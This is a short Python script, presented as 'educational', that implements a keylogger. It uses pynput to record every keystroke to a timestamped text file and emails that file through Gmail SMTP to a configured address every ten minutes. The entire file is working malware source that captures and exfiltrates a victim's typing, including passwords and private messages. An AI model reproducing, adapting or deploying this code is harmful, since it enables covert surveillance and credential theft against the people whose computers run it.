# Made by Rolando Esteban Enriquez Limon
# Date: 16/02/2022
# Only for educational purposes!!

import datetime
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from pynput.keyboard import Listener
import time

# Time that it will take every txt sent to the email, in this case 10 minutes
now = time.time()
future = now + 600
sender_email = 'your@gmail.com'
receiver_email = 'your@outlook.com'

message = MIMEMultipart()

message["From"] = sender_email
message["To"] = receiver_email
message["Subject"] = "El deber"

# The txt sent to the email will be called as the time that it was created
d = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
strD = 'keylogger_{}.txt'.format(d)

# Send Email function
def send_email():

    attachment = open(strD, 'rb')
    obj = MIMEBase('application', 'octet-stream')
    obj.set_payload((attachment).read())
    encoders.encode_base64(obj)
    obj.add_header('Content-Disposition', "attachment; filename= " + strD)
    message.attach(obj)

    my_message = message.as_string()
    email_session = smtplib.SMTP('smtp.gmail.com', 587)
    email_session.starttls()
    email_session.login(sender_email, 'password')

    email_session.sendmail(sender_email, receiver_email, my_message)

    email_session.quit()
    print("YOUR MAIL HAS BEEN SENT SUCCESSFULLY")


# Evaluate every key pressed and convert it into a string
def key_recorder(key):
    # global of variables prior used
    global now, future

    f = open(strD, 'a')

    #Loop of time to send an email every 10 minutes
    if time.time() > future:
        send_email()
        now = time.time()
        future = now + 600

    key = str(key)



    if key == 'Key.enter':
        f.write('\n')
    elif key == 'Key.space':
        f.write(' ')
    elif key == 'Key.backspace':
        f.write('%BORRAR%')
    else:
        f.write(key.replace("'", ""))

# Listener of keyboard
with Listener(on_press=key_recorder) as l:
    l.join()


